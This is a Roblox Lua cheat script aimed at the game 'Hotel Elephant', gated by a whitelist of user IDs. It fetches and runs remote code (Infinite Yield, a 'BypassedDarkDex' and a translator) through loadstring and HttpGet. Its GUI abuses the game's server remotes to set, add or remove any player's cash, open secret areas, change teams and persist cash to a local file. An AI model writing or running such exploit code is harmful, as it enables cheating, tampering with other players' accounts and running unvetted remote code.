if not game:IsLoaded() then game.Loaded:Wait() end
local whitelisted = {
    1829166929, 2707380590, -- FurryBoy
    3726073197, 4531589092 -- Ghoster
}
local tableFindGamePlace = { 23578803 }
local LocalPlayer = game:GetService("Players").LocalPlayer
function kick(title, message)
    game:GetService("Players").LocalPlayer:Kick()
    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text = message
    game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ErrorPrompt.TitleFrame.ErrorTitle.Text = title
end
if table.find(whitelisted, LocalPlayer.UserId) then
    print("User is whitelisted. Hi "..LocalPlayer.DisplayName)
    if table.find(tableFindGamePlace, game.PlaceId) then
        wait(0.1)
        local m = Instance.new("Message", game:GetService("Workspace"))
        m.Text = "Loading..."
        wait(0.2)
        m.Text = "Loading Infinite Yield..."
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        m.Text = "Loading Translator..."
        loadstring(game:HttpGetAsync('https://i.qts.life/r/ChatInlineTranslator.lua', true))()
        m.Text = "Loading Dex..."
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
        m.Text = "Deleting Helicopter Model..."
        game:GetService("Workspace").Chopper:Remove()
        m.Text = "Loading Cash..."
        --game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Who wants cash?", "All")
        local fileExist = isfile("CashSaves.txt")
        if fileExist then
            local val = game:GetService("Players").LocalPlayer.leaderstats.Cash
            game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, -val.Value, "Cash")
            local contents = readfile("CashSaves.txt")
            game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, contents, "Cash", game:GetService("Players").LocalPlayer)
        end
        m.Text = "Loading GUI..."
        local screenGui = Instance.new("ScreenGui")
        screenGui.Enabled = true
        screenGui.ResetOnSpawn = false
        screenGui.Parent = game:GetService("CoreGui")
        
        local plrGui = screenGui
        m.Text = "Loading Buttons..."
        local textBox_User = Instance.new("TextBox")
        textBox_User.Text = ""
        textBox_User.PlaceholderText = "Enter Username (can be shortened)\n\nLeave blank for yourself"
        textBox_User.ClearTextOnFocus = true
        textBox_User.PlaceholderColor3 = Color3.new(0, 0, 0)
        textBox_User.Name = "User_TextBox"
        textBox_User.Size = UDim2.new(0, 200, 0, 50)
        textBox_User.Position = UDim2.new(0, 660, 0, 850)
        textBox_User.Parent = plrGui
        
        local textBox_CashValue = Instance.new("TextBox")
        textBox_CashValue.Text = ""
        textBox_CashValue.TextSize = "15"
        textBox_CashValue.PlaceholderText = "Enter Cash Value"
        textBox_CashValue.ClearTextOnFocus = true
        textBox_CashValue.PlaceholderColor3 = Color3.new(0, 0, 0)
        textBox_CashValue.Name = "Cash_Value_TextBox"
        textBox_CashValue.Size = UDim2.new(0, 200, 0, 50)
        textBox_CashValue.Position = UDim2.new(0, 660, 0, 910)
        textBox_CashValue.Parent = plrGui
        
        local screengui_2 = Instance.new("ScreenGui", game:GetService("CoreGui"))
        screengui_2.Name = "ScreenGui(2)"
        screengui_2.Enabled = true
        screengui_2.ResetOnSpawn = false
        
        local textButton_Gui_Toggle = Instance.new("TextButton")
        textButton_Gui_Toggle.TextSize = "18"
        textButton_Gui_Toggle.Text = "Toggle Gui"
        textButton_Gui_Toggle.Name = "Toggle_Gui_Button"
        textButton_Gui_Toggle.Size = UDim2.new(0, 150, 0, 50)
        textButton_Gui_Toggle.Position = UDim2.new(0, 0, 0, 715)
        textButton_Gui_Toggle.Parent = screengui_2
        
        local textButton_Open_Secret_Base = Instance.new("TextButton")
        textButton_Open_Secret_Base.TextSize = "16"
        textButton_Open_Secret_Base.Text = "Open\nSecret Base"
        textButton_Open_Secret_Base.Name = "Open_Secret_Base_Button"
        textButton_Open_Secret_Base.Size = UDim2.new(0, 150, 0, 50)
        textButton_Open_Secret_Base.Position = UDim2.new(0, 0, 0, 775)
        textButton_Open_Secret_Base.Parent = screengui_2
        
        local textButton_Open_Secret_Base_2 = Instance.new("TextButton")
        textButton_Open_Secret_Base_2.TextSize = "16"
        textButton_Open_Secret_Base_2.Text = "Open\nSecret Base 2"
        textButton_Open_Secret_Base_2.Name = "Open_Secret_Base_Button_2"
        textButton_Open_Secret_Base_2.Size = UDim2.new(0, 150, 0, 50)
        textButton_Open_Secret_Base_2.Position = UDim2.new(0, 160, 0, 775)
        textButton_Open_Secret_Base_2.Parent = screengui_2
        
        local textButton_Reset_Button = Instance.new("TextButton")
        textButton_Reset_Button.TextSize = "18"
        textButton_Reset_Button.Text = "Reset"
        textButton_Reset_Button.Name = "Reset_Button"
        textButton_Reset_Button.Size = UDim2.new(0, 150, 0, 50)
        textButton_Reset_Button.Position = UDim2.new(0, 0, 0, 835)
        textButton_Reset_Button.Parent = screengui_2
        
        local textButton_Neutral_Team_Changer_Button = Instance.new("TextButton")
        textButton_Neutral_Team_Changer_Button.TextSize = "13"
        textButton_Neutral_Team_Changer_Button.Text = "Change Team to\nNeutral"
        textButton_Neutral_Team_Changer_Button.Name = "Change Team Neutral"
        textButton_Neutral_Team_Changer_Button.Size = UDim2.new(0, 150, 0, 50)
        textButton_Neutral_Team_Changer_Button.Position = UDim2.new(0, 0, 0, 895)
        textButton_Neutral_Team_Changer_Button.Parent = screengui_2
        
        local textButton_Set = Instance.new("TextButton")
        textButton_Set.TextSize = "15"
        textButton_Set.Text = "Set Cash"
        textButton_Set.Name = "Cash_Set_Button"
        textButton_Set.Size = UDim2.new(0, 125, 0, 35)
        textButton_Set.Position = UDim2.new(0, 1145, 0, 887)
        textButton_Set.Parent = plrGui
        
        local textButton_Add = Instance.new("TextButton")
        textButton_Add.TextSize = "15"
        textButton_Add.Text = "Add Cash"
        textButton_Add.Name = "Cash_Add_Button"
        textButton_Add.Size = UDim2.new(0, 125, 0, 35)
        textButton_Add.Position = UDim2.new(0, 1010, 0, 887)
        textButton_Add.Parent = plrGui
        
        local textButton_Remove = Instance.new("TextButton")
        textButton_Remove.TextSize = "13"
        textButton_Remove.Text = "Remove Cash"
        textButton_Remove.Name = "Cash_Remove_Button"
        textButton_Remove.Size = UDim2.new(0, 125, 0, 35)
        textButton_Remove.Position = UDim2.new(0, 875, 0, 887)
        textButton_Remove.Parent = plrGui
        
        local textButton_Copy = Instance.new("TextButton")
        textButton_Copy.TextSize = "10"
        textButton_Copy.Text = "Copy Player's\nCash Value"
        textButton_Copy.Name = "Copy_Cash_Value_Button"
        textButton_Copy.Size = UDim2.new(0, 125, 0, 35)
        textButton_Copy.Position = UDim2.new(0, 1010, 0, 933)
        textButton_Copy.Parent = plrGui
        m.Text = "Loading Functions..."
        function message(str)
            local h = Instance.new("Hint", game:GetService("Workspace"))
            h.Text = str
            wait(3)
            h:Destroy()
        end
        
        textButton_Gui_Toggle.MouseButton1Click:Connect(function()
            screenGui.Enabled = not screenGui.Enabled
        end)
        
        textButton_Open_Secret_Base.MouseButton1Click:Connect(function()
            game:GetService("ReplicatedStorage").DoorOpener:FireServer(game:GetService("Workspace").CaveOpening.CaveButton)
            message("Opened Secret Base")
        end)
        
        textButton_Open_Secret_Base_2.MouseButton1Click:Connect(function()
            game:GetService("ReplicatedStorage").DoorOpener:FireServer(game:GetService("Workspace").UpperDoor.CaveButton)
            message("Opened Secret Base 2")
        end)
        
        textButton_Reset_Button.MouseButton1Click:Connect(function()
            game:GetService("ReplicatedStorage").Resetter:FireServer()
        end)
        
        textButton_Neutral_Team_Changer_Button.MouseButton1Click:Connect(function()
            game:GetService("ReplicatedStorage").ChangeTeam:InvokeServer("Neutral")
        end)
        
        textButton_Set.MouseButton1Click:Connect(function()
            local plrName = textBox_User.Text
            local Players = game:GetService("Players")
            local PlayerFound = false
            for _, player in pairs(Players:GetPlayers()) do
                if player.Name:lower():find(plrName:lower()) then
                    local setValue = tonumber(textBox_CashValue.Text)
                    local value = game:GetService("Players")[player.Name].leaderstats.Cash
                    game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, -value.Value, "Cash", game:GetService("Players")[player.Name])
                    game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, setValue, "Cash", game:GetService("Players")[player.Name])
                    message("Set " .. player.Name .. "'s Cash to " .. setValue)
                    PlayerFound = true
                    break
                end
            end
            if not PlayerFound then
                message("Player not found.")
            end
        end)
        
        textButton_Add.MouseButton1Click:Connect(function()
            if tonumber(textBox_CashValue.Text) < 0 then
                message("Error: Value is negative.")
            else
                local plrName = textBox_User.Text
                local Players = game:GetService("Players")
                local PlayerFound = false
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name:lower():find(plrName:lower()) then
                        local setValue = tonumber(textBox_CashValue.Text)
                        game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, setValue, "Cash", game:GetService("Players")[player.Name])
                        message("Added " .. setValue .. " Cash for " .. player.Name)
                        PlayerFound = true
                        break
                    end
                end
                if not PlayerFound then
                    message("Player not found.")
                end
            end
        end)
        
        textButton_Remove.MouseButton1Click:Connect(function()
            if tonumber(textBox_CashValue.Text) < 0 then
                message("Error: Value is negative.")
            else
                local plrName = textBox_User.Text
                local Players = game:GetService("Players")
                local PlayerFound = false
                for _, player in pairs(Players:GetPlayers()) do
                    if player.Name:lower():find(plrName:lower()) then
                        local setValue = tonumber(textBox_CashValue.Text)
                        game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, -setValue, "Cash", game:GetService("Players")[player.Name])
                        message("Removed " .. setValue .. " Cash for " .. player.Name)
                        PlayerFound = true
                        break
                    end
                end
                if not PlayerFound then
                    message("Player not found.")
                end
            end
        end)
        
        textButton_Copy.MouseButton1Click:Connect(function()
            local plrName = textBox_User.Text
            local Players = game:GetService("Players")
            local PlayerFound = false
            for _, player in pairs(Players:GetPlayers()) do
                if player and player.Name:lower():find(plrName:lower()) then
                    local setValue = tonumber(textBox_CashValue.Text)
                    local value = game:GetService("Players")[player.Name].leaderstats.Cash.Value
                    syn.write_clipboard(value)
                    message("Copied to clipboard!")
                    PlayerFound = true
                    break
                end
            end
            if not PlayerFound then
                message("Player not found.")
            end
        end)
        m.Text = "Script Loaded!"
        wait(2)
        m:Remove()
        while true do
            wait(1.5)
            local cashValue = game:GetService("Players").LocalPlayer.leaderstats.Cash.Value
            writefile("CashSaves.txt", cashValue)
        end
    else
        kick("Error", "You are in a different game.\nFor the script to work, join Hotel Elephant.")
    end
else
    kick("Whitelist Error", "You are not whitelisted in this project!")
end
